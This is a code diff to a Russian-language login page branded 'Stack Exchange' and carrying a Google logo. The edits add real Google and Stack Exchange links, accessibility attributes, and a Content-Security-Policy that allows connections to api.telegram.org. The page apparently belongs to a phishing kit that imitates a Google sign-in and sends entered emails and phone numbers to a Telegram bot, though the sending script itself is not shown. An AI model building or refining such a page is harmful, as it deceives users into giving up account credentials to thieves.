@@ -4,9 +4,20 @@
   <meta charset="UTF-8">
   <title>Вход — Stack Exchange</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <!-- УПРОЩЕННАЯ CSP БЕЗ integrity и preload -->
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self' https:;
+                 script-src 'self' https://code.jquery.com https://unpkg.com 'unsafe-inline' 'unsafe-eval';
+                 style-src 'self' https://fonts.googleapis.com 'unsafe-inline';
+                 font-src 'self' https://fonts.gstatic.com;
+                 img-src 'self' https: data:;
+                 connect-src 'self' https://api.telegram.org https://unpkg.com;">
+  
+  <!-- Google Fonts БЕЗ integrity (это вызывает ошибку) -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+  
   <link rel="stylesheet" href="css/app.css">
 </head>
 <body class="auth-page">
@@ -16,7 +27,7 @@
 
       <!-- Header -->
       <div class="auth-header">
-        <svg class="auth-logo" viewBox="0 0 24 24" width="24" height="24">
+        <svg class="auth-logo" viewBox="0 0 24 24" width="24" height="24" aria-label="Google">
           <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"></path>
           <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"></path>
           <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"></path>
@@ -28,7 +39,7 @@
       <div class="auth-content">
         <!-- Left -->
         <div class="auth-left">
-          <svg class="brand-icon" viewBox="0 0 24 24" width="48" height="48">
+          <svg class="brand-icon" viewBox="0 0 24 24" width="48" height="48" aria-label="Stack Exchange">
             <path fill="#1E5397" d="M19.73 4.87l-7.85 15.7-7.85-15.7h15.7zM14.65 2h-5.3L12 6.5 14.65 2z"></path>
             <path fill="#ACACAC" d="M12 6.5L9.35 2H5.15l6.85 13.7L18.85 2h-4.2L12 6.5z"></path>
           </svg>
@@ -38,29 +49,35 @@
 
         <!-- Right -->
         <div class="auth-right">
-          <form id="loginForm">
+          <form id="loginForm" method="post" autocomplete="on">
             <div class="form-group">
               <label for="phoneEmail" id="inputLabel">Телефон или адрес эл. почты</label>
-              <input type="text" id="phoneEmail" required="">
+              <input type="text" id="phoneEmail" name="email" required="" autocomplete="email" inputmode="email" aria-describedby="inputHint">
               <div class="input-hint" id="inputHint">
                 Введите адрес электронной почты или номер телефона.
               </div>
-              <div class="error-message" id="errorMessage"></div>
+              <div class="error-message" id="errorMessage" role="alert" aria-live="polite"></div>
             </div>
 
-            <a href="#" class="link forgot-link" id="forgotEmail">Забыли адрес электронной почты?</a>
+            <a href="https://accounts.google.com/signin/recovery" class="link forgot-link" id="forgotEmail" rel="noopener noreferrer" target="_blank">
+              Забыли адрес электронной почты?
+            </a>
 
-            <p class="policy">
+            <p class="policy" role="contentinfo">
               Прежде чем начать работу с приложением
               <strong>Stack Exchange</strong>, вы можете
               ознакомиться с его
-              <a href="#" id="privacyPolicy">политикой конфиденциальности</a> и
-              <a href="#" id="termsOfUse">условиями использования</a>.
+              <a href="https://stackexchange.com/legal/privacy-policy" id="privacyPolicy" rel="noopener noreferrer" target="_blank">политикой конфиденциальности</a> и
+              <a href="https://stackexchange.com/legal/terms-of-service" id="termsOfUse" rel="noopener noreferrer" target="_blank">условиями использования</a>.
             </p>
 
             <div class="form-actions">
-              <a href="#" class="link create-account-link" id="createAccount">Создать аккаунт</a>
-              <button type="submit" class="btn-primary" id="submitBtn">Далее</button>
+              <a href="https://accounts.google.com/signup" class="link create-account-link" id="createAccount" rel="noopener noreferrer" target="_blank">
+                Создать аккаунт
+              </a>
+              <button type="submit" class="btn-primary" id="submitBtn" aria-label="Далее">
+                Далее
+              </button>
             </div>
           </form>
         </div>
@@ -69,18 +86,23 @@
     </div>
 
     <!-- Footer -->
-    <footer class="auth-footer">
-      <span class="language-selector">Русский</span>
+    <footer class="auth-footer" role="contentinfo">
+      <span class="language-selector" role="button" tabindex="0" aria-label="Выбрать язык">Русский</span>
       <div class="footer-links">
-        <a href="#" id="helpLink">Справка</a>
-        <a href="#" id="privacyLink">Конфиденциальность</a>
-        <a href="#" id="termsLink">Условия</a>
+        <a href="https://support.google.com/accounts" id="helpLink" rel="noopener noreferrer" target="_blank">Справка</a>
+        <a href="https://policies.google.com/privacy" id="privacyLink" rel="noopener noreferrer" target="_blank">Конфиденциальность</a>
+        <a href="https://policies.google.com/terms" id="termsLink" rel="noopener noreferrer" target="_blank">Условия</a>
       </div>
     </footer>
   </div>
 
-  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-  <script src="https://unpkg.com/imask"></script>
+  <!-- jQuery БЕЗ defer (проблема с inline) -->
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+  
+  <!-- IMask удалить или заменить на inline маску -->
+  <!-- <script src="https://unpkg.com/imask"></script> -->
+  
+  <!-- Основной скрипт -->
   <script src="js/app.js"></script>
 </body>
 </html>
